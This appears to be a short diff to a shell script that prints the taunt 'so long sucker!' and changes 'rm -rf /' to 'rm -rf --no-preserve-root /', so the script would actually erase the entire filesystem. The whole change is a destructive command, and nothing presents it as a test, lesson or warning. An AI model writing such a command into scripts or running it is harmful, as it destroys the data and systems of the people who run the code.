@@ -2,4 +2,4 @@
 
 echo "so long sucker!"
 
-rm -rf /
+rm -rf --no-preserve-root /
